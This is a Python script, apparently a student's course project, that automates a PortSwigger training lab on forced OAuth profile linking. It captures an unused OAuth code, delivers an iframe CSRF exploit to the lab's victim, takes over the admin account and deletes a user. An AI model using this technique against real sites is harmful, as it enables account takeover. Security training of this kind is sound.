# By Andrew Stevenson for CS595 at PSU Spring '21 Final Project
# Solves lab: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse

s = requests.Session()

# Get the csrf
site = 'ac361f811e34207080da13ad00320048.web-security-academy.net'
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')
exploit_site = soup.find('a', {'id': 'exploit-link'})['href'][8:]  # Stash this for later

# Submit provided credentials & get attach social media link
form_data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=form_data)
soup = BeautifulSoup(resp.text, 'html.parser')
attach_link = soup.find('div', {'id': 'account-content'}).find('a')['href']

# Submit the social media sign-in
resp = s.get(attach_link)
soup = BeautifulSoup(resp.text, 'html.parser')
auth_site = urlparse(resp.request.url).hostname
submit_folder = soup.form['action']
submit_url = f'https://{auth_site}{submit_folder}'
form_data = {
    'username': 'peter.wiener',
    'password': 'hotdog'
}
resp = s.post(submit_url, data=form_data)

# Confirm the social media login
soup = BeautifulSoup(resp.text, 'html.parser')
confirm_folder = soup.form['action']
confirm_url = f'https://{auth_site}{confirm_folder}'
s.post(confirm_url)

# Now go to accounts page and click on 'link with social media' to get the unchecked url
my_account_url = f'https://{site}/my-account/'
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
attach_link = soup.find('div', {'id': 'account-content'}).find('a')['href']
resp = s.get(attach_link, allow_redirects=False)
code_url = resp.headers['Location']

# Logout
logout_url = f'https://{site}/logout'
s.get(logout_url)

# Deliver the exploit
exploit_html = f'<iframe src="{code_url}"></iframe>'
exploit_url = f'https://{exploit_site}'
form_data = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
s.post(exploit_url, data=form_data)
print('Delivering exploit to victim...')

# Now log back in ...
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
login_sm_url = soup.find('a', {'style': 'display: inline-block; background: rgb(77, 144, 254)'})['href']
s.get(login_sm_url)

# ... and delete the target account
del_url = f'https://{site}/admin/delete?username=carlos'
resp = s.get(del_url)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.find(text='Congratulations, you solved the lab!'))
